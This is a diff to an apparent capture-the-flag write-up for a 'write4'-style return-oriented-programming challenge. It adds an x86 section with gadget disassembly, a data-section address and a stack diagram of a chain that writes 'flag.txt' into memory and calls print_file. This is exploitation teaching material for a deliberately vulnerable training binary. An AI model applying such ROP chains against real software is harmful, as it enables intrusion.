@@ -12,7 +12,7 @@ to send the `flag.txt` string to the `print_file` function.
 
 0000000000400628 <usefulGadgets>:
   400628:	4d 89 3e         mov    QWORD PTR [r14],r15
-  40062b:	c3               ret
+  40062b:	c3         ret
 
 0000000000400690 <__libc_csu_init + 0x60>:
   400690:	41 5e            pop    r14
@@ -50,5 +50,35 @@ store gadget, then pop bss address into `rdi` and finally jump to the print_file
 │ ...                     │
 ```
 ## x86:
+```asm
+[24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4
 
+080483d0 <print_file@plt>:
+
+08048543 <usefulGadgets>:
+ 8048543:	89 2f            mov    DWORD PTR [edi],ebp
+ 8048545:	c3               ret
+
+080485aa <__libc_csu_init + 0x5a>:
+ 80485aa:	5f               pop    edi
+ 80485ab:	5d               pop    ebp
+ 80485ac:	c3               ret  
+```
+In x86, words are 4 bytes long, so we'll need to do 2 arbitrary writes of 4 bytes each, to
+compose the string `flag.txt`. We use the data section this time, its size being 8 bytes.
+The payload is then very similar to the x86_64 one.
+```             
+┌─────────────┐                                    │ ...         │
+│ 0x080485aa  │ <- pop edi; pop ebp; ret;          ├─────────────┤
+├─────────────┤                                    │ 0x080483d0  │ <- print_file
+│ 0x0804a018  │ <- DATA                            ├─────────────┤
+├─────────────┤                                    │ 0x0804a018  │ <- DATA
+│ "flag"      │ <- String literal                  ├─────────────┤
+├─────────────┤                                    │ ...         │
+│ 0x08048543  │ <- mov DWORD PTR [edi], ebp; ret
+├─────────────┤
+│ ...         │
+```
+The left block is repeated 2 times, writing `flag` then `.txt` at DATA and DATA+4 respectively.
+Then we call print_file using the written string address.
 ## ARMv5:
